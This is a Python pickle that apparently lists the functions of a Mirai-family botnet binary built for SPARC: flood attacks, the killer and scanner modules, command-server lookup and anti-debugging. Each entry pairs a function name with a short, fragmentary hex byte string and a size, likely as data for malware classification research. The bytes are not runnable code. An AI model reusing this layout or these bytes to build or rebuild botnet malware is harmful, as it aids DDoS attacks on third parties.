(lp0
(S'_init'
p1
S'9de3984000280000338100'
p2
L28L
tp3
a(S'__do_global_dtors_aux'
p4
S'9de3982300801900b8c44000800300'
p5
L124L
tp6
a(S'call___do_global_dtors_aux'
p7
S'9de3988100'
p8
L12L
tp9
a(S'frame_dummy'
p10
S'9de3980300'
p11
L96L
tp12
a(S'call_frame_dummy'
p13
S'9de3988100'
p14
L12L
tp15
a(S'_start'
p16
S'bc235894035617004019001218136840005c01000000000400053801'
p17
L76L
tp18
a(S'attack_app_http'
p19
S'03'
p20
L6896L
tp21
a(S'attack_get_opt_str'
p22
S'900aff00842084a00a809202104000bf6004c3e09010'
p23
L64L
tp24
a(S'attack_get_opt_ip'
p25
S'9de3989610001019'
p26
L56L
tp27
a(S'attack_get_opt_int'
p28
S'9de3989610001019'
p29
L60L
tp30
a(S'attack_start'
p31
S'9de398400001008029800100400001008080800300d861a40300da61a8009c9010181c010040009210092810000000101b4000bf60ff00c204a0ff882080f98302bfe0'
p32
L188L
tp33
a(S'attack_parse'
p34
S'9de3988080f806008061fa0e204e200220847f8302a0001008979210181008100080961002000033c2f8c4e098030129fc86e0840dc204a3ff8820'
p35
L468L
tp36
a(S'attack_kill_all'
p37
S'9de3980300d00080c04000921009240000b8'
p38
L72L
tp39
a(S'add_attack'
p40
S'9de39892100800b840001e9010012a04100822000ca4d0a82a40006c9202c2a48460012ca4'
p41
L92L
tp42
a(S'attack_init'
p43
S'9de398901000004f7fff921290100100507fff921290100200517f'
p44
L176L
tp45
a(S'attack_gre_eth'
p46
S'9de36092100400ff209610001008'
p47
L1324L
tp48
a(S'attack_gre_ip'
p49
S'9de370100400900e20b4a002101b'
p50
L1200L
tp51
a(S'attack_tcp_stomp'
p52
S'9de3380e2040009010101008231010209610001008fc71101a003fd0be1b237ffc6a101a10041040ae1008fc90101a2fbe057ffc5e90101a2fbefffc5890101a100b1008fc5290101a2fbe0c1001fc4c90101a2fbe0d7ffc4690101a2fbe0e961000fc4090101a2fbe96207ffc3a101b20b8'
p53
L1584L
tp54
a(S'attack_tcp_ack'
p55
S'9de34092100400da0ea002101b'
p56
L1412L
tp57
a(S'attack_tcp_syn'
p58
S'9de35092100400790e20b4a002101b'
p59
L1392L
tp60
a(S'attack_udp_plain'
p61
S'9de3880e2040001c101010081f180ea03f9410079614ff1008f82790101a101b007ff82110001000'
p62
L504L
tp63
a(S'attack_udp_generic'
p64
S'9de3781004009f900e20b4a002101bffaf90101a003f92101b1003ffa8101a37bf0410407ff792101b20ae1008f714ff1006aa1008f79614ff37bf1bf792101b22baff8a101b1001ff8400b8d60092101bff7d10191008a000a21002001180a41008100027bf030004a20027bff8901012e81e48010083d00107bf02040101002803008480030001'
p65
L968L
tp66
a(S'attack_udp_vse'
p67
S'9de39092100400ff009410021008f6210092101b23baffb6101a10041040b8ffb0101a1005aa1008f692101b1006a8007ff6101b0017001aff9d9612871090101d400004101db6009210031c90100280a2100127bf0300981004a200400018'
p68
L864L
tp69
a(S'attack_udp_dns'
p70
S'9de34092100400b4a002101bffe5101a003fd0b79614ff1003f5de101b37b794100410407ff5d8101b2fb79410057ff5d214ff2fb792101bf5cc90101a37b794100796103590101a37b792101bf5c0009410001008f5ba941008101bff9690101a005090101e9210001b009d921000004390101e80941000101012921011121010'
p71
L1444L
tp72
a(S'checksum_generic'
p73
S'1020920284800202bf008005c20100'
p74
L96L
tp75
a(S'checksum_tcpudp'
p76
S'9de3988800c42006201020b6'
p77
L184L
tp78
a(S'mem_exists'
p79
S'8010c3e09010004a008004000180862080058120900201a2ffc403c3e00100'
p80
L96L
tp81
a(S'killer_kill'
p82
S'0300d0621300800100'
p83
L24L
tp84
a(S'killer_kill_by_port'
p85
S'03ff'
p86
L1348L
tp87
a(S'killer_init'
p88
S'03ff'
p89
L1624L
tp90
a(S'anti_gdb_entry'
p91
S'030000b881'
p92
L20L
tp93
a(S'teardown_connection'
p94
S'9de39831008005400000208091'
p95
L48L
tp96
a(S'ensure_single_instance'
p97
S'9de3802094100027bf3d21009607bf0412941004a200242017272700b89210030d10001012010d1000b880008084600100b8'
p98
L348L
tp99
a(S'main'
p100
S'9de368d04000000e90101000fd9210020040003a1014000c10010056400008007410020d408009007410020d50800b100127bf154000040010007300d80c01000300'
p101
L2100L
tp102
a(S'resolve_cnc_addr'
p103
S'9de398400061901003002c1003000100b000400054901003800100400017e22000e10e008302040100b8400097c204004990100410000013120034028081e0'
p104
L148L
tp105
a(S'rand_next'
p106
S'0500b8d0a1d400b80900c2e0200b30'
p107
L80L
tp108
a(S'rand_str'
p109
S'9de3981060000080e7067fd00010208001007fffb27fd00010207f'
p110
L104L
tp111
a(S'rand_alphastr'
p112
S'9de370007407bfb89410218080157fff01008400862088bf08088003010108c200bfa00480b27f7fff40007f102100b02080e4a66003'
p113
L160L
tp114
a(S'rand_init'
p115
S'9de3984000df00b84000e94000f71c080ce061d800b8d061dc008100'
p116
L80L
tp117
a(S'resolv_skip_name'
p118
S''
p119
L124L
tp120
a(S'resolv_entries_free'
p121
S'9de3989096200200d020a20000001500808100'
p122
L56L
tp123
a(S'resolv_domain_to_hostname'
p124
S'9de3984000b61019020180882080058007'
p125
L120L
tp126
a(S'resolv_lookup'
p127
S'9de30003cf9010011018'
p128
L948L
tp129
a(S'consume_any_prompt'
p130
S'8400c218809000c21ca0008008808004a0009002ffa2000100812080ed'
p131
L112L
tp132
a(S'can_consume'
p133
S'c218020180c3e0904020'
p134
L28L
tp135
a(S'scanner_kill'
p136
S'0300d062800100'
p137
L24L
tp138
a(S'deobf'
p139
S'9de3984000810201134000064000008000800640002801bf80'
p140
L92L
tp141
a(S'add_auth_entry'
p142
S'9de3902300d2e4041000f49202a407bf0804e41012'
p143
L204L
tp144
a(S'setup_connection'
p145
S'9de388062027bfecc0800427bf15921001129210000620a000400045c018201003080300921004120108'
p146
L196L
tp147
a(S'recv_strip_null'
p148
S'9de39890101800400027921019808420c2198084a041c21980bf80'
p149
L84L
tp150
a(S'scanner_init'
p151
S'9de36801000300140584804000ce01000300d06200c2200300d06240000e90108000d06200'
p152
L5784L
tp153
a(S'table_retrieve_val'
p154
S'0300846280'
p155
L40L
tp156
a(S'toggle_obf'
p157
S'0300900aff2a0300b8973098100180896010080228020200080228020200080228020200080228021204a0'
p158
L140L
tp159
a(S'table_lock_val'
p160
S'900affbf00'
p161
L16L
tp162
a(S'table_unlock_val'
p163
S'900affbf00'
p164
L16L
tp165
a(S'add_entry'
p166
S'9de398400090101a10080194101a00b8'
p167
L64L
tp168
a(S'table_init'
p169
S'9de39890100300'
p170
L1004L
tp171
a(S'util_strlen'
p172
S'84009010004a0080'
p173
L32L
tp174
a(S'util_memcpy'
p175
S'10bf012a0002ffbf400000'
p176
L44L
tp177
a(S'util_strcpy'
p178
S'9de39890101880b020b000c209bf207f'
p179
L56L
tp180
a(S'util_zero'
p181
S'107f900201a2'
p182
L36L
tp183
a(S'util_itoa'
p184
S'9de370a6a032a6200220800aa62080b000b000a22fbf12bf204000400100'
p185
L220L
tp186
a(S'util_memsearch'
p187
S'88008000008620813fff4a00a00086e0800690020100000201bf8010ff00'
p188
L96L
tp189
a(S'util_atoi'
p190
S'9de398e200c200bf208080e200106018200080a610018003'
p191
L372L
tp192
a(S'util_fdgets'
p193
S'9de398a010181018100101800b0401808000bf008000'
p194
L100L
tp195
a(S'util_local_addr'
p196
S'9de3800292100200a210020a1000008011100237bf0227bf35c2e6101000ec9407bfda07bf'
p197
L132L
tp198
a(S'util_stristr'
p199
S'9810084b400abf60018090100c0abf'
p200
L152L
tp201
a(S'util_strcmp'
p202
S'8820c208bf208420c209bfa0028086008120c200809202900201a0'
p203
L116L
tp204
a(S'util_strncmp'
p205
S'8620c208bfe08420c209bfa00a808094bf094a4000809202900201bff9c400100110'
p206
L120L
tp207
a(S'fork'
p208
g119
L52L
tp209
a(S'.urem'
p210
S'81000100947209e09022'
p211
L32L
tp212
a(S'.udiv'
p213
S'81008100'
p214
L20L
tp215
a(S'.umul'
p216
S'9052008100'
p217
L12L
tp218
a(S'.rem'
p219
S'953a1f8100010094fa0080943a0922'
p220
L44L
tp221
a(S'fcntl'
p222
S'9de390'
p223
L136L
tp224
a(S'fcntl64'
p225
S'9de390'
p226
L100L
tp227
a(S'chdir'
p228
S'9de398'
p229
L68L
tp230
a(S'close'
p231
S'9de398'
p232
L68L
tp233
a(S'getpid'
p234
S'9de398'
p235
L64L
tp236
a(S'getppid'
p237
S'9de398'
p238
L64L
tp239
a(S'ioctl'
p240
S'9de390'
p241
L100L
tp242
a(S'kill'
p243
S'9de398'
p244
L72L
tp245
a(S'open'
p246
S'9de39094100027a054fa27a0198e02a05094101a27bf10321080ba2008a000b000b03fff2200'
p247
L120L
tp248
a(S'creat'
p249
S'9410091300bf00'
p250
L20L
tp251
a(S'prctl'
p252
S'9de398'
p253
L84L
tp254
a(S'read'
p255
S'9de398'
p256
L76L
tp257
a(S'readlink'
p258
S'9de398'
p259
L76L
tp260
a(S'select'
p261
S'9de398'
p262
L84L
tp263
a(S'setsid'
p264
S'9de398'
p265
L64L
tp266
a(S'sigprocmask'
p267
S'9de398901018a660008094101aa00010808096100800b03fff2200e820100880b400b400'
p268
L140L
tp269
a(S'time'
p270
S'9de398'
p271
L72L
tp272
a(S'unlink'
p273
S'9de398'
p274
L68L
tp275
a(S'write'
p276
S'9de398'
p277
L76L
tp278
a(S'closedir'
p279
S'9de388007007bf18060092129010118094101000'
p280
L136L
tp281
a(S'opendir'
p282
S'9de34013001018'
p283
L260L
tp284
a(S'readdir'
p285
S'9de3880620130010100b921240001306200620800ec60c0600d22000d420a200201020c00406200620000820040420c203bf2007bf010ab0008100'
p286
L168L
tp287
a(S'__errno_location'
p288
S'1100901250'
p289
L12L
tp290
a(S'clock'
p291
S'9de3880c9007bfecc4bfff230300'
p292
L56L
tp293
a(S'bcopy'
p294
S'96100810'
p295
L12L
tp296
a(S'memmove'
p297
S'80400800960280768b03020a8080eb8a12600480'
p298
L1448L
tp299
a(S'memcpy'
p300
S'9822092303808008bf600480'
p301
L4196L
tp302
a(S'sub_1AD98'
p303
S'81'
p304
L8L
tp305
a(S'sub_1ADA0'
p306
S'81'
p307
L8L
tp308
a(S'bzero'
p309
S'1000'
p310
L8L
tp311
a(S'memset'
p312
S'8660ff10021002a2001008'
p313
L192L
tp314
a(S'sub_1AE9C'
p315
S'81'
p316
L8L
tp317
a(S'strcpy'
p318
S'840080e4202000860094130102920298239002048b0bbf3ffc8b6018808b6010808b60088080efda3ffc81009b33da3ffcc0fe100232fc8100c0fc8100da400023803f806f80292a0033ca022bda40003398238a400680f8ca008bff8099338099600822008080ec9002042a0010023200100232002a021002bf6010808b60082a003201bf60ff10022a002a011002808b6010320002042bda40003398238a400680f8ca008bff809933ca00bf60088080ec9002043200100232002a0210022a04c3e0901002890260103200bf60081002808b60182a0002042bda40003398238a400680f8ca008bffbf6010bf60088080ed90020433da00c00210023204c3e09010022a00bf601010'
p319
L804L
tp320
a(S'inet_addr'
p321
S'9de390901018002ba200'
p322
L40L
tp323
a(S'accept'
p324
S'9de398'
p325
L76L
tp326
a(S'bind'
p327
S'9de38827bf'
p328
L36L
tp329
a(S'connect'
p330
S'9de398'
p331
L76L
tp332
a(S'getsockname'
p333
S'9de398'
p334
L76L
tp335
a(S'getsockopt'
p336
S'9de398'
p337
L84L
tp338
a(S'listen'
p339
S'9de3909010043fbf459207bf'
p340
L28L
tp341
a(S'recv'
p342
S'9de3883fbf'
p343
L32L
tp344
a(S'recvfrom'
p345
S'9de398'
p346
L88L
tp347
a(S'send'
p348
S'9de3883fbf'
p349
L32L
tp350
a(S'sendto'
p351
S'9de398'
p352
L88L
tp353
a(S'setsockopt'
p354
S'9de380bfe8f6bff44000'
p355
L44L
tp356
a(S'socket'
p357
S'9de398'
p358
L76L
tp359
a(S'raise'
p360
S'9de3987ff61018bf00'
p361
L20L
tp362
a(S'sigaddset'
p363
S'9de398'
p364
L56L
tp365
a(S'sigemptyset'
p366
S'9de3989210001080'
p367
L32L
tp368
a(S'signal'
p369
S'9de380008004a6208027bf091016c200e82010bf032084'
p370
L188L
tp371
a(S'__sigismember'
p372
S'9202'
p373
L40L
tp374
a(S'__sigaddset'
p375
S'86009202842090100032932ac209c3e0c2'
p376
L44L
tp377
a(S'__sigdelset'
p378
S'86009202842090100032932ac209e0c4'
p379
L44L
tp380
a(S'malloc'
p381
S'9de3908004a63ff810201800'
p382
L320L
tp383
a(S'calloc'
p384
S'9de398a0a620020081000100'
p385
L112L
tp386
a(S'free'
p387
S'9de39880a0063ffc3100901622101000901500c240830380a000b99014aca4040c0090100080c404002916228081a005c208200880c20480c204250090121c241300b9b0202212bfe0'
p388
L232L
tp389
a(S'realloc'
p390
S'9de3988006a21018ffb0203020126007b0001000a404fcb07f800304fcb020a600082000b890141c0419009012380190141ca4a00406401280c2fc7fff90063ffca08092101180a2'
p391
L280L
tp392
a(S'__heap_alloc'
p393
S'c20008800200801a0004000180'
p394
L160L
tp395
a(S'__heap_alloc_at'
p396
S'8800940220020000801b000980940a0a80'
p397
L156L
tp398
a(S'__heap_link_free_area'
p399
S'd4600880d62210a00080d2e08100'
p400
L48L
tp401
a(S'__heap_link_free_area_after'
p402
S'80032200220822'
p403
L24L
tp404
a(S'__heap_free'
p405
S'9de398882090101880'
p406
L268L
tp407
a(S'atol'
p408
S'921000c0800100'
p409
L20L
tp410
a(S'strtol'
p411
S'961001800100'
p412
L16L
tp413
a(S'_stdlib_strto_l'
p414
S'9de3980300c668'
p415
L428L
tp416
a(S'exit'
p417
S'9de38800b89414489212a200a810110000b880059fc01018009c9210010000000000a0000000'
p418
L128L
tp419
a(S'sleep'
p420
S'9de3002012bf0800c07880830227bff4a01014'
p421
L428L
tp422
a(S'__uClibc_fini'
p423
S'9de3980500b8'
p424
L132L
tp425
a(S'__pthread_return_0'
p426
S'8120'
p427
L8L
tp428
a(S'_pthread_cleanup_push_defer'
p429
S'8100'
p430
L8L
tp431
a(S'__check_one_fd'
p432
S'9de398921001f8901018809210190076ff9a00020040009d01008100'
p433
L68L
tp434
a(S'__uClibc_init'
p435
S'9de39805000080'
p436
L104L
tp437
a(S'__uClibc_main'
p438
S'9de32000b8c4620300830200b884e0c43c0680a000'
p439
L620L
tp440
a(S'__socketcall'
p441
S'9de398'
p442
L72L
tp443
a(S'_exit'
p444
S'9de398'
p445
L64L
tp446
a(S'fstat'
p447
S'9de358'
p448
L104L
tp449
a(S'__getdents'
p450
S'9de3989010180092101980b44018e86008066004400006600c066013600406600b0e6012600af41800921019f414166008166008a6401abf6010'
p451
L136L
tp452
a(S'__getdents64'
p453
S'9de398'
p454
L288L
tp455
a(S'getegid'
p456
S'9de398'
p457
L64L
tp458
a(S'geteuid'
p459
S'9de398'
p460
L64L
tp461
a(S'getgid'
p462
S'9de398'
p463
L64L
tp464
a(S'getuid'
p465
S'9de398'
p466
L64L
tp467
a(S'lseek64'
p468
S'9de390'
p469
L112L
tp470
a(S'nanosleep'
p471
S'9de398'
p472
L72L
tp473
a(S'sbrk'
p474
S'9de39821008007a20020a200b03fff80'
p475
L84L
tp476
a(S'times'
p477
S'9de398'
p478
L72L
tp479
a(S'__xstat64_conv'
p480
S'9de398921000'
p481
L140L
tp482
a(S'__xstat_conv'
p483
S'9de398921000'
p484
L156L
tp485
a(S'inet_aton'
p486
S'80008015c3e09010004a00'
p487
L220L
tp488
a(S'sigaction'
p489
S'9de38000c20027bf801e9007bf8827bf8427bf18a6a003be78000080b000800b07be048007be06941080be8407be88'
p490
L160L
tp491
a(S'abort'
p492
S'9de38800b890126c842010bf032084'
p493
L316L
tp494
a(S'_dl_aux_init'
p495
S'c42000b903008160'
p496
L28L
tp497
a(S'brk'
p498
S'9de398'
p499
L60L
tp500
a(S'__syscall_rt_sigaction'
p501
S'9de398'
p502
L80L
tp503
a(S'__do_global_ctors_aux'
p504
S'9de3980300c47f8008c0c400bf008100'
p505
L60L
tp506
a(S'call___do_global_ctors_aux'
p507
S'9de3988100'
p508
L12L
tp509
a(S'_fini'
p510
S'9de3987fcc5101008100'
p511
L20L
tp512
a.